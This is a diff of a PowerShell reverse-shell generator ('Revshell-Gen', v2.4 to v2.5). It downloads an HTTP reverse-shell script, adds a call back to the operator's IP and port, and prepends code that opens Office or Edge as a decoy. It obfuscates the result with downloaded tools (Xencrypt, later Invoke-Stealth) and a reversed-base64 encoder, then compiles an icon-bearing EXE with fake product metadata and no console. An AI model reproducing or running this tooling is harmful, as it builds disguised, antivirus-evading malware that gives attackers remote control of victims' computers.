@@ -1,11 +1,11 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 $ProgressPreference = "SilentlyContinue" ; $ErrorActionPreference = "SilentlyContinue"
 $OSVersion = [Environment]::OSVersion.Platform ; if (!$OSVersion -like 'Unix') { $Host.UI.RawUI.BackgroundColor = 'Black' }
-Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.4 - by @JoelGMSec"
+Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.5 - by @JoelGMSec"
 
 function Show-Banner { Clear-Host
     Write-Host
-    Write-Host "__________                    ___            __   __    " -NoNewLine -ForegroundColor Blue ; Write-Host "            ________        v2.4   " -ForegroundColor Green
+    Write-Host "__________                    ___            __   __    " -NoNewLine -ForegroundColor Blue ; Write-Host "            ________        v2.5   " -ForegroundColor Green
     Write-Host "\______   \ ____ __  __ _____|   |___  ____ |  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "           /   ____/  ____ _____   " -ForegroundColor Green   
     Write-Host " |       _// __ \  \/  /  ___/       |/ __ \|  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "  ______  /   /  ___ / __ \     \  " -ForegroundColor Green
     Write-Host " |    |   \  ___/\    /\___ \|   |   |  ___/|  |_|  |__ " -NoNewLine -ForegroundColor Blue ; Write-Host " /_____/  \   \__\  \  ___/  |   \ " -ForegroundColor Green
@@ -42,16 +42,8 @@ function Show-Help {
 function Kill-Program {
     $Host.UI.RawUI.ForegroundColor = 'White'
     Write-Host ; Write-Host "[!] Deleting temporary files.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
-    Remove-Item $InvokePath -Force ; Remove-Item $XencryptPath -Force ; Remove-Item $PS2exePath -Force ; Remove-Item $IconPath -Force
+    Remove-Item $ScriptPath -Force ; Remove-Item $InvokeStealthPath -Force ; Remove-Item $PS2exePath -Force ; Remove-Item $IconPath -Force
     Write-Host ; Write-Host "[!] Exiting!" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2000 ; exit }
-
-function Best64-Encoder {
-    $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($InvokePath)) ; $b64 = "`"$base64`""
-    $base64rev = $b64.ToCharArray() ; [array]::Reverse($base64rev) ; $best64 = -join $base64rev | out-file $InvokePath
-    @('$best64code=') + (Get-Content $InvokePath) | Set-Content $InvokePath
-    Add-Content $InvokePath '$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null'
-    Add-Content $InvokePath '$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))'
-    Add-Content $InvokePath 'Invoke-Expression $LoadCode'}
 
 # Main function
 function Create-Payload {
@@ -126,16 +118,16 @@ if($template -in 'Custom') {
 
 # System & Other variables
     if ($OSVersion -like 'Unix') { 
-        $InvokePath = "./Invoke-WebRev.ps1"
-        $XencryptPath = "./xencrypt.ps1"
+        $ScriptPath = "./Invoke-WebRev.ps1"
+        $InvokeStealthPath = "./Invoke-Stealth.ps1"
         $PS2exePath = "./ps2exe.ps1"
         $OutfilePath = "./$AppName.exe"
         $IconPath = "./$AppName.ico"
         $ip = hostname -I | awk '{print $1}' }
 
     else { 
-        $InvokePath = "$env:temp\Invoke-WebRev.ps1"
-        $XencryptPath = "$env:temp\xencrypt.ps1"
+        $ScriptPath = "$env:temp\Invoke-WebRev.ps1"
+        $InvokeStealthPath = "$env:temp\Invoke-Stealth.ps1"
         $PS2exePath = "$env:temp\ps2exe.ps1"
         $OutfilePath = "$pwd\$AppName.exe"
         $IconPath = "$env:temp\$AppName.ico"
@@ -160,11 +152,12 @@ $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_Cu
 & $Question ; Write-Host "Do you want to encrypt with SSL? [y/n]:` " -ForegroundColor Gray -NoNewLine ; Write-Host "yes" -ForegroundColor Green ; $enablessl = "yes" }
 
 # Download Invoke-WebRev.ps1 & add content
-Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.." -ForegroundColor Blue
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1","$InvokePath")
+Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.. " -ForegroundColor Blue -NoNewLine
+(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1","$ScriptPath")
+Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
 # Open legitimate Office Application
-if($AppName -in 'msedge') { $a = Get-Content $InvokePath ; $b = "start microsoft-edge: `n" ; Set-Content $InvokePath -value $b, $a }
+if($AppName -in 'msedge') { $a = Get-Content $ScriptPath ; $b = "start microsoft-edge: `n" ; Set-Content $ScriptPath -value $b, $a }
 if($AppName -in 'WINWORD','EXCEL','OUTLOOK') { 
 
   $ScriptA = { 
@@ -173,25 +166,26 @@ if($AppName -in 'WINWORD','EXCEL','OUTLOOK') {
     $env:PATH += ';' + ($appPaths -join ';') ; $Office = $appPaths | findstr /i office | Select -First 1 }
 
   $ScriptB = "if(`$Office){ Start-Process `"`$Office\$AppName`" 2>&1> `$null }"
-  $Content = Get-Content $InvokePath ; Set-Content $InvokePath -value $ScriptA`n, $ScriptB`n, $Content }
+  $Content = Get-Content $ScriptPath ; Set-Content $ScriptPath -value $ScriptA`n, $ScriptB`n, $Content }
 
 # Add config to script
 if($enablessl -like 'y*') { $ssl = "-ssl" }
-Add-Content $InvokePath '$ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; $ConfirmPreference = "None"'
-Add-Content $InvokePath "Invoke-WebRev -ip $ip -port $port $ssl"
+Add-Content $ScriptPath '$ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; $ConfirmPreference = "None"'
+Add-Content $ScriptPath "Invoke-WebRev -ip $ip -port $port $ssl"
 
-# Encode Best64 & Encrypt PS1 with Xencrypt
-Write-Host ; Write-Host "[+] Downloading Xencrypt and doing some encryption.. " -ForegroundColor Blue -NoNewLine
-Best64-Encoder ; $RandomNumber = Get-Random (150..250) ; Write-Host "[$RandomNumber iterations]" -ForegroundColor Green
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1","$XencryptPath")
-Import-Module $XencryptPath -Force ; Invoke-Xencrypt -InFile $InvokePath -OutFile $InvokePath -Iterations $RandomNumber 2>&1> $null
+# Download Invoke-Stealth & Obfuscate Code
+Write-Host ; Write-Host "[+] Downloading last version of Invoke-Stealth.. " -ForegroundColor Blue -NoNewLine
+Invoke-WebRequest -UseBasicParsing https://darkbyte.net/invoke-stealth.php -outfile $InvokeStealthPath
+Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
+& $InvokeStealthPath $ScriptPath -technique all -nobanner
 
 # Download PS2exe & Compile EXE file
-Write-Host ; Write-Host "[+] Downloading PS2exe and generating payload.." -ForegroundColor Blue
+Write-Host "[+] Downloading PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$PS2exePath")
 if ($OSVersion -like 'Unix') { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -AsByteStream } else { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte }
 if ($OSVersion -like 'Unix') { (Get-Content $PS2exePath).Replace("powershell","pwsh") | Set-Content $PS2exePath ; (Get-Content $PS2exePath).Replace("PowerShell","pwsh") | Set-Content $PS2exePath }
-Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $InvokePath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
+Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
+Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
 
 Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
